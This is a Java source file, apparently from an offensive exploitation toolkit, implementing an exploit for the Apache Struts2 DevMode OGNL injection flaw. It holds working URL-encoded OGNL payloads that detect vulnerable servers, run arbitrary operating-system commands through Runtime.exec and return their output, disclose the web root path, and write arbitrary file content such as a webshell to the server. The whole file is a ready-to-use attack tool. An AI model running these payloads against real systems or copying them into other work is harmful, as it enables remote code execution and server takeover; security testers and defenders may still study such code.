package fun.fireline.exp.apache.struts2;

import fun.fireline.core.ExploitInterface;
import fun.fireline.tools.HttpTool;

import java.net.URLEncoder;
import java.util.UUID;

/**
 * @author yhy
 * @date 2021/8/17 13:57
 * @github https://github.com/yhy0
 */

public class S2_DevMode implements ExploitInterface {

    private String target = null;
    private boolean isVul = false;

    private String check_payload = "debug=browser&object=(%23mem=%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f%23context[%23parameters.rpsobj[0]].getWriter().println(%23parameters.content[0]):xx.toString.json&rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=UUID";

    private String payload = "debug=browser&object=(%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23context%5B%23parameters.rpsobj%5B0%5D%5D.getWriter().println(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command%5B0%5D).getInputStream()))):xx.toString.json&rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=webpath881118888&command=payload";

    private String webPath = "?debug=browser&object=(%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23context%5B%23parameters.rpsobj%5B0%5D%5D.getWriter().println(%23context%5B%23parameters.reqobj%5B0%5D%5D.getRealPath(%23parameters.pp%5B0%5D))):sb.toString.json&rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&command=Is-Struts2-Vul-URL&pp=%2f&reqobj=com.opensymphony.xwork2.dispatcher.HttpServletRequest";

    @Override
    public boolean checkVul(String url) {
        this.target = url;
        String uuid =  UUID.randomUUID().toString();
        try {
            String data = this.check_payload.replace("UUID", uuid);
            String result = HttpTool.postHttpReuest(this.target, "application/x-www-form-urlencoded", data, "UTF-8");
            boolean flag = result.contains(uuid);
            if(flag) {
                this.isVul = true;
                this.webPath = result.replace(uuid, "");
            }
            return flag;
        } catch (Exception e) {
            logger.error(e);
        }
        return false;
    }

    @Override
    public String exeCmd(String cmd, String encoding) {
        try {
            String data = payload.replace("payload", cmd);
            String result = HttpTool.postHttpReuest(this.target, "application/x-www-form-urlencoded", data, encoding);
            return result;

        } catch (Exception e) {
            logger.error(e);
        }
        return "fail";
    }

    @Override
    public String getWebPath() {
        try {
            String result = HttpTool.getHttpReuest(this.target + webPath, "application/x-www-form-urlencoded", "UTF-8");
            return result;

        } catch (Exception e) {
            logger.error(e);
        }
        return "命令执行失败";
    }

    @Override
    public String uploadFile(String fileContent, String filename, String platform) throws Exception {
        fileContent = URLEncoder.encode(fileContent, "UTF-8" );

        String payload = "debug=browser&object=(%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23req%3d%40org.apache.struts2.ServletActionContext%40getRequest(),%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding[0]),%23w%3d%23res.getWriter(),%23path%3d%23req.getRealPath(%23parameters.pp[0]),new%20java.io.BufferedWriter(new%20java.io.FileWriter(%23path%2b%23parameters.shellname[0]).append(%23parameters.shellContent[0])).close(),%23w.print(1128112382),%23w.close())&shellname=/SHELLPATH&shellContent=SHELLContent&encoding=UTF-8&pp=%2f";

        payload = payload.replace("SHELLPATH", filename).replace("SHELLContent", fileContent);

        String result = HttpTool.postHttpReuest(this.target, "multipart/form-data; boundary=----WebKitFormBoundaryDpxd5NY6NhpFBen1", payload, "UTF-8");

        if(result.contains("1128112382")) {
            result = result + "  上传成功! ";
        } else {
            result =  "上传失败";
        }

        return result;

    }

    @Override
    public boolean isVul() {
        return this.isVul;
    }
}
